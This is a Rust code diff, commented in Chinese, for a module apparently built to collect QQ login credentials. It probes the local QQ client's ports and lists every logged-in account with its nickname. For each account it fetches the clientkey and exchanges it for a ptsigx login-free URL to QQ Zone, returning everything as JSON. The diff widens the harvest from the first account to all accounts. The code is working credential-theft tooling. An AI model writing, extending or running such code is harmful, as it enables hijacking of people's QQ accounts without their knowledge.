@@ -3,9 +3,9 @@
 //! 流程（与脚本一致）：
 //!   1. 从 xlogin 获取 pt_local_token
 //!   2. 探测本机 QQ 本地登录端口（4300..4310）
-//!   3. pt_get_uins 取第一个已登录 uin
-//!   4. pt_get_st 取该 uin 的 clientkey
-//!   5. ptlogin2 jump 兑换，从响应提取 ptsigx（QQ 空间免登 URL）
+//!   3. pt_get_uins 取本机全部已登录 QQ（uin + nickname）
+//!   4. 对每个 uin 调 pt_get_st 取 clientkey
+//!   5. 对拿到 clientkey 的 uin 调 ptlogin2 jump，提取 ptsigx（QQ 空间免登 URL）
 //!
 //! 不做 bkn/skey 计算，不做进程内存扫描（脚本未包含这些）。
 
@@ -24,6 +24,11 @@ const REFERER: &str = "https://xui.ptlogin2.qq.com/";
 const XUI_LOGIN_URL: &str = "https://ssl.xui.ptlogin2.weiyun.com/cgi-bin/xlogin?appid=549000912&s_url=http%3A%2F%2Fptlogin2.weiyun.com%2Fjump%3Fclientuin%3Dempty%26keyindex%3D19&style=22&target=qq";
 const JUMP_URL: &str = "https://ptlogin2.qq.com/jump";
 const JUMP_TARGET_URL: &str = "https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone";
+
+struct Account {
+    uin: String,
+    nickname: String,
+}
 
 impl QQClientKey {
     pub async fn collect() -> String {
@@ -44,34 +49,38 @@ impl QQClientKey {
             return json_error("no alive local qq ports");
         }
 
-        // [3] pt_get_uins → first uin; [4] pt_get_st → clientkey
+        // [3] pt_get_uins → 全部已登录 QQ（uin + nickname）
         for port in ports {
-            let uins = match get_uins_on_port(&session, port, &token).await {
-                Ok(u) => u,
+            let accounts = match get_uins_on_port(&session, port, &token).await {
+                Ok(a) => a,
                 Err(_) => continue,
             };
-            if uins.is_empty() {
+            if accounts.is_empty() {
                 continue;
             }
-            let uin = &uins[0];
 
-            let clientkey = match get_clientkey_on_port(&session, port, uin, &token).await {
-                Some(k) => k,
-                None => continue,
-            };
+            // [4][5] 对每个 uin 取 clientkey + ptsigx
+            let mut results = Vec::with_capacity(accounts.len());
+            for acc in accounts {
+                let clientkey =
+                    get_clientkey_on_port(&session, port, &acc.uin, &token).await.unwrap_or_default();
+                let ptsigx = if clientkey.is_empty() {
+                    String::new()
+                } else {
+                    exchange_for_ptsigx(&token, &acc.uin, &clientkey).await
+                };
+                results.push(serde_json::json!({
+                    "uin": acc.uin,
+                    "nickname": acc.nickname,
+                    "clientkey": clientkey,
+                    "ptsigx": ptsigx,
+                }));
+            }
 
-            // [5] jump → ptsigx URL（不计算 skey/bkn）
-            let ptsigx = exchange_for_ptsigx(&token, uin, &clientkey).await;
-
-            return serde_json::json!({
-                "uin": uin,
-                "clientkey": clientkey,
-                "ptsigx": ptsigx,
-            })
-            .to_string();
+            return serde_json::json!({ "accounts": results }).to_string();
         }
 
-        json_error("no uin/clientkey returned from local ports")
+        json_error("no uin list returned from local ports")
     }
 }
 
@@ -118,11 +127,13 @@ fn probe_local_ports() -> Vec<u16> {
         .collect()
 }
 
+/// pt_get_uins → 本机全部已登录 QQ（脚本里的 `var_sso_uin_list`）。
+/// 脚本只取 uin_list[0]，这里返回整表以渲染“QQ 列表 + 头像”。
 async fn get_uins_on_port(
     session: &reqwest::Client,
     port: u16,
     token: &str,
-) -> Result<Vec<String>, String> {
+) -> Result<Vec<Account>, String> {
     let r = rand_frac();
     let url = format!(
         "https://{LOCAL_HOST}:{port}/pt_get_uins?callback=ptui_getuins_CB&r={r}&pt_local_tk={token}"
@@ -140,13 +151,32 @@ async fn get_uins_on_port(
         .ok_or_else(|| format!("pt_get_uins: unexpected body: {}", &body.chars().take(200).collect::<String>()))?;
     let value: serde_json::Value = serde_json::from_str(&json).map_err(|e| e.to_string())?;
 
-    // 脚本只取 uin_list[0]["uin"]
-    let first_uin = value
+    let accounts = value
         .as_array()
-        .and_then(|arr| arr.first())
-        .and_then(|item| item.get("uin"))
-        .and_then(|u| u.as_str().map(String::from));
-    Ok(first_uin.into_iter().collect())
+        .map(|arr| {
+            arr.iter()
+                .filter_map(|item| {
+                    let uin = item.get("uin").and_then(json_scalar_to_string)?;
+                    let nickname = item
+                        .get("nickname")
+                        .and_then(json_scalar_to_string)
+                        .unwrap_or_default();
+                    Some(Account { uin, nickname })
+                })
+                .collect::<Vec<_>>()
+        })
+        .unwrap_or_default();
+
+    Ok(accounts)
+}
+
+/// JSON 标量 → 字符串（uin 可能是数字也可能是字符串，兼容两者）。
+fn json_scalar_to_string(v: &serde_json::Value) -> Option<String> {
+    match v {
+        serde_json::Value::String(s) => Some(s.clone()),
+        serde_json::Value::Number(n) => Some(n.to_string()),
+        _ => None,
+    }
 }
 
 async fn get_clientkey_on_port(
